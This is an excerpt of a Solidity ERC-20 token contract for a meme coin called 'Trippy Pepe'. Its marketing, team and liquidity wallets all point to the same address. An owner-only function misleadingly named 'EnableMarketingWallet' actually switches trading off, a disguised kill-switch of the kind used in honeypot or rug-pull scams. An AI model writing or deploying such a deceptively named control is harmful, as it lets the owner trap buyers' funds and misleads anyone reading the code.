...
contract TrippyPepe is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    address payable public marketingAddress =
        payable(0x685F98BB9750cbA3923165DcdaA42Fca511A9e9d); // Marketing Address
        
    address payable public teamAddress =
        payable(0x685F98BB9750cbA3923165DcdaA42Fca511A9e9d); // Team Address
        
    address payable public liquidityAddress =
        payable(0x685F98BB9750cbA3923165DcdaA42Fca511A9e9d); // Liquidity Address
    ...
    string private constant _name = "Trippy Pepe";

    string private constant _symbol = "$TrippyPepe";
    ...
    function EnableMarketingWallet() external onlyOwner {
        tradingActive = false;
    }
